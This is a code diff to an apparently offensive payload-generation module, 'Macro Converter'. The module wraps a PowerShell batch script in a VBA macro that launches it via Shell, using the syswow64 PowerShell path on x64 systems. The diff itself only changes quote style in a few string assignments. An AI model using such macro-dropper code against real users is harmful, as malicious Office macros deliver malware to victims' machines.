@@ -21,7 +21,7 @@ class PayloadModule:
         self.name = "Macro Converter"
         self.path = "auxuliary/macro_converter"
         self.cli_opts = cli_obj
-        self.payload_source_code = ''
+        self.payload_source_code = ""
 
         self.required_options = {
             "POSH_BATCH": ["", "Path to a powershell batch script"],
@@ -76,7 +76,7 @@ class PayloadModule:
         shell = "Shell(exec)"
         bottom = "End Sub\r\n\r\n"
 
-        PayloadCode = ''
+        PayloadCode = ""
         PayloadCode = top + "\r\n" + payL + "\r\n\r\n" + execStr + "\r\n\r\n" + shell + "\r\n\r\n" + bottom + "\r\n"
 
         # Return
@@ -85,8 +85,8 @@ class PayloadModule:
 
     def formStr(self, varstr, instr):
         holder = []
-        str1 = ''
-        str2 = ''
+        str1 = ""
+        str2 = ""
         print(self.required_options['ARCHITECTURE'])
         if varstr == "exec" and self.required_options['ARCHITECTURE'][0] == "x64":
             str1 = varstr + ' = "C:\\Windows\\syswow64\\windowspowershell\\v1.0\\' + instr[:54] + '"'
